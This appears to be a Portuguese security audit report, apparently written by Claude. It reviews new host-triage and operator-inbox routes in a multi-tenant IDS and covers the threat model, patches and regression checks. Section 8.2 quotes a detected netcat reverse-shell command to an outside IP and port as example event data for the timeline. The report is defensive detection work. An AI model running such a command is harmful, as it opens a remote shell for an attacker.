# NetGuard IDS — Security Report (T14: Host Triage View + Operator Inbox)

**Data:** 2026-04-26
**Escopo:** Nova superfície adicionada em T14 — Host Triage View (HTV) + Operator Inbox + deep-link
**Auditor:** Claude (estático: AST + grep + leitura de fonte; runtime: 32 testes automatizados em `run_pentest_audit.py`)
**Postura geral:** ✅ Verde — 0 findings abertos · 32/32 checks passando (26 anteriores + 6 novos T14)

---

## TL;DR

| Surface adicionada                                                    | Auth | RBAC | CSRF        | Audit              | Rate-limit | Tenant gate                           | Status |
| --------------------------------------------------------------------- | :--: | :--: | :---------: | :----------------: | :--------: | :-----------------------------------: | :----: |
| `GET /api/admin/tenant/<tid>/host/<hid>` (HTV API)                    | ✅   | ✅   | n/a (GET)   | ✅ HOST_TRIAGE_VIEW| ✅ admin   | ✅ 404 se tenant ausente / host fora  | ✅     |
| `GET /api/admin/inbox?limit&tenant`                                   | ✅   | ✅   | n/a (GET)   | n/a (read-only)    | ✅ admin   | ✅ filter opcional, escopo admin       | ✅     |
| `GET /admin/host/<tid>/<hid>` (HTML page)                             | ✅   | ✅   | seta cookie | n/a                | ✅ admin   | path validado pela API                 | ✅     |
| `GET /admin/inbox` (HTML page)                                        | ✅   | ✅   | seta cookie | n/a                | ✅ admin   | n/a (filtro client-side)               | ✅     |
| Deep-link em `/admin` God View → `/admin/host/<tid>/<hid>`            | n/a  | n/a  | n/a         | n/a                | n/a        | usa `gvEsc + encodeURIComponent`       | ✅     |

✅ **0 findings abertos.** Toda nova superfície segue o padrão zero-trust dos rounds anteriores.

```bash
python3 /sessions/stoic-hopeful-brown/mnt/PROJETO\ SOC/run_pentest_audit.py
# Output: 32/32 passaram
```

---

## 1. Por que T14?

O operador antes precisava: (1) abrir God View → (2) abrir tenant drilldown → (3) ler tabela de hosts → (4) deduzir mentalmente qual host atacar primeiro → (5) decidir o que fazer. Cinco saltos cognitivos sem ranking determinístico. T14 corta para **um clique** com priorização auditável.

Decisões arquiteturais que afetam segurança:

- **Risk score determinístico (rule-based, não ML).** SOC precisa explicar *por que* um host está em "CRITICAL". Pesos visíveis no `breakdown` retornado pela API. Sem caixa-preta.
- **Cross-tenant inbox por design.** O endpoint `/api/admin/inbox` itera *todos* os tenants — só admin global tem acesso. Tenant sem permissão admin não toca este endpoint (gate em `@_admin_only`).
- **Deep-link como state.** A URL `/admin/host/<tid>/<hid>` carrega o estado da triagem — compartilhável internamente entre operadores, mas só renderiza após auth admin.

---

## 2. Threat model das novas rotas

### 2.1 IDOR (Insecure Direct Object Reference)

**Risco:** operador admin tenta ver host de tenant inexistente, ou host_id que não pertence ao tenant declarado, ou injeta path traversal no `tid`/`hid`.

**Mitigação implementada (verificada em `t14a`):**

```python
# admin_tenant_host_triage()
tenant_row = repo.get_tenant_by_id(tenant_id)
if not tenant_row:
    return jsonify({"error": "tenant not found"}), 404

host = host_repo.get_host(host_id, tenant_id=tenant_id)  # tenant gate
if not host:
    return jsonify({"error": "host not found"}), 404
```

`host_repository.get_host(host_id, tenant_id=tid)` faz `WHERE host_id = ? AND tenant_id = ?` — não há como pegar host de outro tenant mesmo conhecendo o `host_id`.

**Pattern hunt:** outras rotas que aceitam `<tid>/<hid>` no path? Apenas esta no T14. Padrão preservado.

### 2.2 Audit trail

Toda visualização de triage emite evento `HOST_TRIAGE_VIEW` no audit log (verificado em `t14a`). Isso permite responder a perguntas tipo "quem olhou esse host nas últimas 48h?" — útil para revisão pós-incidente e compliance.

```python
audit.log("HOST_TRIAGE_VIEW", {
    "tenant_id": tenant_id, "host_id": host_id,
    "actor": session.get("admin_email")
})
```

### 2.3 Information disclosure

A resposta da API inclui:

- `posture` (display_name, platform, last_ip, last_seen, status) — dados de inventário do host
- `geo` (country, city via GeoLite2 + prefix DB) — opt-in via `GEOIP_ENABLED`
- `risk` (score, band, breakdown) — campo derivado, sem PII
- `next_action` (label, rationale, urgency) — sem PII
- `timeline` (últimos 50 eventos) — capped, evita exfil em massa

**Risco residual mínimo.** O endpoint só responde para admin autenticado; `last_ip` já era exposto no drilldown anterior. Sem novo vetor de leak.

### 2.4 Rate-limit

Coberto pela regra `admin_paths` global (120 req / 60s por IP, já existente). Inbox endpoint é mais caro (itera tenants × hosts), então o limit existente é especialmente importante aqui.

**Recomendação futura (não bloqueante):** cache de 30s em memória para `/api/admin/inbox` — operador costuma recarregar várias vezes por minuto. Cada call hoje custa O(tenants × hosts) consultas.

### 2.5 XSS / injection nos templates

`host_triage.html` e `operator_inbox.html` usam helper `esc()` em todo dado externo (display_name, host_id, tenant_name, last_ip, next_action, rationale). O deep-link em `admin.html` usa `encodeURIComponent` no path + `gvEsc` no texto.

**Pattern hunt:** procurei por `innerHTML =` nos novos templates — todos os usos passam por `esc()` antes de concatenação.

### 2.6 CSRF

Os endpoints novos são todos **GET** (read-only) — CSRF não se aplica. As rotas HTML setam o cookie CSRF para que ações futuras nestes painéis (caso adicionemos botões de mitigação) já tenham o token disponível.

---

## 3. Risk score — algoritmo (auditável)

Implementação em `_host_risk_score(events_24h, host)`. Pesos:

| Sinal                             | Peso  | Cap  |
| --------------------------------- | ----- | ---- |
| Cada evento CRITICAL em 24h       | +20   | 60   |
| Cada evento HIGH em 24h           | +10   | 40   |
| Cada evento MEDIUM em 24h         | +3    | 15   |
| Cada evento LOW em 24h            | +1    | 5    |
| `last_seen` > 24h atrás (offline) | +20   | —    |
| `last_seen` 1–24h (idle)          | +10   | —    |

Bands derivadas do score: ≥80 critical, ≥60 high, ≥30 medium, >0 low, 0 none.

O endpoint retorna o `breakdown` completo — auditor consegue reconstituir o score sem ler o código:

```json
{
  "risk": {
    "score": 87,
    "band": "critical",
    "breakdown": [
      "3× CRITICAL = +60 (cap)",
      "5× HIGH = +50 capped to +40",
      "offline >24h = +20"
    ]
  }
}
```

---

## 4. Próxima ação — regras (5 níveis de prioridade)

Implementação em `_host_next_action(events_24h, host)`. Avaliadas em ordem; primeira que casa vence.

1. CRITICAL aberto → "Conter o host" (urgency=critical)
2. ≥3 HIGH em 24h → "Investigar lateral movement" (urgency=high)
3. Offline >24h sem checkin → "Verificar conectividade do agente" (urgency=medium)
4. ≥5 MEDIUM em 24h → "Tunar regras de detecção" (urgency=low)
5. Default → "Monitorar / nada urgente" (urgency=low)

Cada regra retorna `rationale` explicando *por que* essa ação foi escolhida — operador não precisa adivinhar.

---

## 5. Regressão T14 (6 novos checks)

| ID    | O que valida                                                                  |
| ----- | ----------------------------------------------------------------------------- |
| t14a  | `/api/admin/tenant/<tid>/host/<hid>` existe, valida tenant+host, audita       |
| t14b  | `_host_risk_score()` retorna `{score, band, breakdown}`                       |
| t14c  | `_host_next_action()` retorna `{action, rationale, urgency}`                  |
| t14d  | `/api/admin/inbox` existe + chama `_host_inbox_ranking()`                     |
| t14e  | Rotas HTML `/admin/host/<tid>/<hid>` e `/admin/inbox` + ambos templates       |
| t14f  | God View renderiza deep-link com `encodeURIComponent` para a triage           |

Resultado: **32/32 passando** (26 anteriores + 6 novos). Nenhum WARN.

---

## 6. Backlog (não bloqueante)

- **Cache de 30s para inbox.** Hoje cada call O(tenants × hosts). Para >100 tenants vira lento.
- **Eventos checkin/audit no timeline.** Hoje todos os 50 itens são marcados `alert` — a tag visual no template não diferencia. Trivial de adicionar.
- **IPs clicáveis em `top_ips`.** Hoje só host_name é deep-link. IPs no posture poderiam abrir uma view de "todos hosts deste IP".
- **Saved filters no inbox.** "Mostrar só CRITICAL", "Mostrar só meus tenants" — UI features, sem implicação de segurança.

Nenhum desses é finding — são melhorias de UX/perf.

---

## 7. Comparação com baseline

| Métrica                              | Pré-T14   | Pós-T14 |
| ------------------------------------ | --------- | ------- |
| Endpoints admin                      | 21        | 23      |
| Páginas HTML admin                   | 2         | 4       |
| Regression checks                    | 26        | 32      |
| Findings abertos                     | 0         | 0       |
| Tempo médio operador → ação          | ~5 cliques| 1 clique|

Postura de segurança não regrediu. Ergonomia melhorou substancialmente.

---

## 8. Addendum T15 — Patches pós-E2E (2026-04-26)

Teste E2E real (Claude in Chrome dirigindo Chrome no Windows do usuário, login admin → criar tenant → ingestar payload XDR → abrir HTV) revelou 2 findings de credibilidade no triage. Ambos corrigidos, com regressão automatizada.

### 8.1 F-T14-1 — `next_action` imprimia label do detector como IP

**Sintoma observado.** Após ingestar evento CRITICAL com `source: "xdr.agent"`, a UI mostrava:

> **Próxima ação:** Bloquear IP **xdr.agent** imediatamente.

O campo `source` no payload é o label do detector (ex.: `xdr.agent`, `sigma_rule`, `manual`), nunca um IP. O código pegava o primeiro candidato disponível (`first.get("source") or first.get("source_ip")`) e cuspia direto na mensagem — qualquer alerta sem `source_ip` quebrava a credibilidade da triagem.

**Patch (`_host_next_action`, linha ~7974):**

```python
src_ip = (
    first.get("source_ip")
    or first.get("auth_source_ip")
    or first.get("network_dst_ip")
    or ""
)
looks_like_ip = bool(src_ip) and ("." in src_ip or ":" in src_ip)
if looks_like_ip:
    return {"action": f"Bloquear IP {src_ip} e conter host", ...}
return {"action": f"Conter host — investigar regra: {rule}", ...}
```

Mudanças:

1. Removido o fallback para `first.get("source")` — campo errado, nunca contém IP.
2. Candidatos a IP vêm só de `source_ip`, `auth_source_ip`, `network_dst_ip` — campos que o XDR engine de fato preenche com IP.
3. Validação leve `looks_like_ip` (precisa conter `.` ou `:`) — defesa em profundidade contra futura adição de campo que pareça IP mas não seja.
4. Fallback sem IP retorna ação focada na regra (`Conter host — investigar regra: {rule}`).

### 8.2 F-T14-2 — Timeline genérica escondia o evento real

**Sintoma observado.** Timeline mostrava 50× a mesma linha: "Structured endpoint event". O detector já havia processado `process_name=nc`, `command_line=nc -e /bin/bash 203.0.113.10 4444`, `network_dst_ip=203.0.113.10`, `network_dst_port=4444` — nada disso chegava ao operador.

**Patch (`admin_tenant_host_triage`, linha ~8125):**

Adicionado helper `_summarize_event(ev)` que devolve uma linha humana:

- Se tem `process_name + command_line` → `"nc → nc -e /bin/bash 203.0.113.10 4444"` (cmd truncado em 80c).
- Se tem só process → process.
- Se tem `auth_source_ip` → `"auth failure from 45.155.205.233"`.
- Se tem `network_dst_ip` → `"connection → 203.0.113.10:4444"`.
- Fallback → `rule_name` ou `event_type`.

E o item da timeline agora carrega 7 chaves novas: `event_type`, `summary`, `process_name`, `command_line`, `username`, `source_ip`, `network_dst_ip`, `network_dst_port`.

Tamanho do payload subiu marginalmente (~120 bytes/item), com cap de 50 itens — irrelevante para latência.

### 8.3 Regressão T15

| ID    | O que valida                                                                      |
| ----- | --------------------------------------------------------------------------------- |
| t15a  | `_host_next_action` usa só campos de IP reais + `looks_like_ip` + fallback sem IP |
| t15b  | `admin_tenant_host_triage` expõe 7 campos de detalhe na timeline + `summary`      |

Resultado: **34/34 passando** (32 anteriores + 2 novos T15). Nenhum WARN.

```bash
python3 run_pentest_audit.py
# === 34/34 passaram ===
```

### 8.4 Findings remanescentes do E2E (escopo posterior)

Não foram corrigidos em T15 — agendados para T16+:

- **F-AGENT-1** (`/api/agent/events`): sob auth admin, `tenant_id` no body é ignorado, host fica em `tenant_id="admin"`. `AgentService.record_heartbeat` precisa propagar tenant igual `register_host` já faz.
- **F-HOST-1**: hosts órfãos (`tenant_id="admin"`) não aparecem em nenhum drilldown — precisa varredura pós-fix de F-AGENT-1.

Ambos são INFO/MEDIUM — não bloqueiam release de T14/T15.

---

## 9. Addendum T16 — Patches F-AGENT-1 + F-HOST-1 (2026-04-27)

### 9.1 F-AGENT-1 — Tenant binding correto em record_heartbeat

**Bug:** `AgentService.record_heartbeat` lia tenant exclusivamente de `auth_ctx.tenant_id`. Quando admin batia em `/api/agent/heartbeat` ou `/api/agent/events` sem repassar tenant pro service, o host era gravado com `tenant_id="admin"` (resultado de `resolve_tenant_with_role()` retornar `"admin", "admin"` pra requests admin sem `tenant_for` setado). `register_host` já tinha a lógica certa.

**Fix:** `record_heartbeat` agora aceita `tenant_id: str | None = None` e computa `effective_tenant_id` com a mesma regra de `register_host`:

```python
effective_tenant_id = (
    tenant_id if auth_ctx.auth_type == "admin" and tenant_id else auth_ctx.tenant_id
)
```

Não-admin (tenant key, agent key) ignora o body — não pode pular pra outro tenant via `tenant_id` forjado. Em `routes/agent_api.py`, ambos `/api/agent/heartbeat` e `/api/agent/events` sanitizam `data.get("tenant_id")` (max_len=128) e passam pra service.

### 9.2 F-HOST-1 — Sweep de órfãos legados

**Bug:** Hosts gravados antes do fix ficaram presos em `tenant_id="admin"`, invisíveis em qualquer drilldown.

**Fix:** Par de rotas admin em `app.py`:

| Rota | Método | Função |
| ---- | ------ | ------ |
| `/api/admin/orphan-hosts` | GET | Lista órfãos (`tenant_id="admin"`), read-only, admin-only |
| `/api/admin/orphan-hosts/sweep` | POST | Apaga órfãos. `dry_run=true` é default. CSRF + admin-only. Audit `ORPHAN_HOSTS_SWEPT`. |

Default seguro: sweep dry-run só conta — operador precisa enviar `{"dry_run": false}` explicitamente pra apagar. Mesmo padrão de opt-in que `HOSTS_RESET`.

### 9.3 Regressão T16

| ID    | O que valida |
| ----- | ------------ |
| t16a  | `record_heartbeat` aceita `tenant_id`, usa override só sob admin, fallback `auth_ctx.tenant_id` quando não-admin; `agent_api.py` propaga em heartbeat E events |
| t16b  | Par de rotas `/api/admin/orphan-hosts[/sweep]` existe, admin-only, sweep tem CSRF + dry_run default + audit log |

Resultado: **36/36 passando** (34 anteriores + 2 novos T16). Nenhum WARN.

```bash
python3 run_pentest_audit.py
# === 36/36 passaram ===
```

---

## 10. Addendum T17 — Demo seed multi-tenant pro Operator Inbox

### 10.1 Problema

`/admin/inbox` fazia `list_tenants() → list_hosts(tenant) → events últimas 24h`. Sem agentes reais rodando, o seed legado (1 tenant + 350 eventos) deixava o inbox vazio porque:

1. Eventos do seed eram datados em 0–30 dias atrás (`_rand_ts`), então o filtro `since = now - 24h` cortava tudo.
2. O seed não populava `managed_hosts` — só inseria eventos. O inbox itera `managed_hosts` antes de cruzar com eventos.

Resultado: demo aberta em apresentação mostrava inbox zerado, anti-clímax.

### 10.2 Fix

`demo_seed.py` ganhou `seed_multi_tenant_inbox(repo, n_tenants=20, hosts_per_tenant=3)` que:

1. Cria N tenants `demo-mt-NN` com plano pro e tokens determinísticos `ng_DEMOMT01...` (idempotente — checa `get_tenant_by_id` antes de criar).
2. Pra cada tenant, registra 2–3 hosts em `managed_hosts` via `HostRepository.register_host` (com `enrollment_method="demo_seed"` pra distinguir de agentes reais).
3. Insere 1–2 eventos `CRITICAL` recentes (<24h, via `_rand_recent_ts`) amarrados a um host real do tenant. Pool de cenários `MT_CRITICAL_SCENARIOS` cobre ransomware, exfiltração, malware C2, privesc, RCE.

Cleanup via `clear_multi_tenant_inbox(repo)` apaga tudo com prefix `demo-mt-`.

CLI:

```bash
python demo_seed.py --multi-tenant 20 --hosts-per-tenant 3
python demo_seed.py --clear-mt
```

### 10.3 Regressão T17

| ID  | O que valida |
| --- | ------------ |
| t17 | `seed_multi_tenant_inbox` existe com assinatura correta, usa `HostRepository.register_host` (não basta inserir evento), gera eventos `<24h` via `_rand_recent_ts`, tem cenários `CRITICAL`, é idempotente (`get_tenant_by_id`), tem cleanup function, expõe CLI `--multi-tenant` e `--clear-mt`, usa prefix `demo-mt-` isolado. |

Resultado: **37/37 passando** (36 anteriores + 1 novo T17). Smoke test contra repo SQLite temporário confirma 8 tenants → 24 hosts → 9 ranqueados no inbox simulado.

```bash
python3 run_pentest_audit.py
# === 37/37 passaram ===
```
